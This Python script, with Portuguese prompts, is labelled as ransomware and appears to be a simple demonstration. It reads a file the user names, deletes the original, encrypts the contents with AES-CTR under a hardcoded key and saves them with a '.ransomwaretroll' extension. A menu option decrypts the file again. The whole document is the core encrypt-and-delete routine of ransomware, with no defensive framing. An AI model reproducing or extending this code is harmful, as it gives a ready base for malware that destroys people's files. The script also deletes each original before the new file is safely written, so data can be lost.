import os
import pyaes

def encrypt_file(file_name, key):
    
    try:
        
        with open(file_name, "rb") as file:
            file_data = file.read()

        
        os.remove(file_name)

        
        aes = pyaes.AESModeOfOperationCTR(key)

        
        crypto_data = aes.encrypt(file_data)

        
        new_file_name = file_name + ".ransomwaretroll"
        with open(new_file_name, "wb") as new_file:
            new_file.write(crypto_data)

        print(f"Arquivo '{file_name}' criptografado com sucesso para '{new_file_name}'.")
    except Exception as e:
        print(f"Erro ao criptografar o arquivo: {e}")

def decrypt_file(file_name, key):
    
    try:
        
        with open(file_name, "rb") as file:
            file_data = file.read()

        
        aes = pyaes.AESModeOfOperationCTR(key)
        decrypt_data = aes.decrypt(file_data)

        
        os.remove(file_name)

        
        original_file_name = file_name.replace(".ransomwaretroll", "")
        with open(original_file_name, "wb") as new_file:
            new_file.write(decrypt_data)

        print(f"Arquivo '{file_name}' descriptografado com sucesso para '{original_file_name}'.")
    except Exception as e:
        print(f"Erro ao descriptografar o arquivo: {e}")

if __name__ == "__main__":
    
    key = b"testeransomwares"  

    print("1. Criptografar arquivo\n2. Descriptografar arquivo")
    choice = input("Escolha uma opção: ")

    if choice == "1":
        file_name = input("Digite o nome do arquivo a ser criptografado: ")
        encrypt_file(file_name, key)
    elif choice == "2":
        file_name = input("Digite o nome do arquivo a ser descriptografado: ")
        decrypt_file(file_name, key)
    else:
        print("Opção inválida.")
